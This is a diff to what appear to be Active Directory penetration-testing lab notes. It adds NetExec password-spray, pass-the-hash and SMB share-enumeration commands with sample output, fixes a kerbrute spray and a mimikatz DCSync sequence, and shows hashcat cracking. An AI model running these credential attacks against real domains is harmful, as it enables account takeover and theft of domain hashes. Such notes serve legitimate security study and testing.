@@ -149,16 +149,30 @@ powershell -ep bypass
 * [+] (Pwn3d!) **Admin Credentials**
 
 ```bash
-# IP Range
+# Spray passwords or hash to validate credentials
 nxc smb 192.168.207.70-75 -u 'mary'  -p 'Nexus123!' -d example.com --no-bruteforce --continue-on-success
+nxc smb 192.168.113.70-76 -u 'dave' --hash 08d7a47a6f9f66b97b1bae4178747494  -d example.com --no-bruteforce --continue-on-success
 
 SMB         192.168.207.70  3389   DC1              [+] corp.com\pete:Nexus123! 
 SMB         192.168.207.72  3389   WEB02            [+] corp.com\pete:Nexus123! (Pwn3d!)
 SMB         192.168.207.74  3389   CLIENT4          [+] corp.com\pete:Nexus123! 
-
 ```
 
-## AD Password Spraying with CrackMap
+```bash
+# Enumerate SMB Shares
+nxc smb 192.168.207.70-75 -u 'mary'  -p 'Nexus123!' -d example.com --shares
+nxc smb 192.168.113.70-76 -u 'dave' --hash 08d7a47a6f9f66b97b1bae4178747494  -d example.com --shares
+
+[*] Enumerated shares
+SMB         192.168.113.72  445    WEB02            Share           Permissions     Remark
+SMB         192.168.113.72  445    WEB02            -----           -----------     ------
+SMB         192.168.113.72  445    WEB02            ADMIN$                          Remote Admin
+SMB         192.168.113.72  445    WEB02            backup          READ,WRITE      
+SMB         192.168.113.72  445    WEB02            C$                              Default share
+SMB         192.168.113.72  445    WEB02            IPC$            READ            Remote IPC
+```
+
+## AD Password Spraying with CrackMap (Obsolete)
 
 Scenario
 
@@ -208,7 +222,7 @@ Kali (cross platform)
 ```shell
 cd tools
 ./kerbrute_linux_386 userenum -d corp.com .\usernames.txt
-./kerbrute_linux_386 passwordspray -d corp.com .\usernames.txt "Nexus123!"s
+./kerbrute_linux_386 passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
 
 The **wordlist usernames.txt MUST be ANSI encoded**. Otherwise you get a network error.
@@ -422,7 +436,6 @@ Cached Tickets: (1)
 Invoke-WebRequest -UseDefaultCredentials http://web01
 ```
 
-
 ## AD Sync Update Attack to dump NTLM hash of domain users
 
 Situation
@@ -435,7 +448,7 @@ Situation
 ```powershell
 mimikatz#
 privilege::debug
-token::inpersonate
+token::elevate
 ...
 lsadump::dcsync /user:corp.com\Administrator
 
@@ -468,7 +481,6 @@ Crack the hash or alternatively pass-the-hash
 ```bash
 hashcat -m 1000 dcsync.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
-
 
 ## AD Kerberos Golden Ticket
 
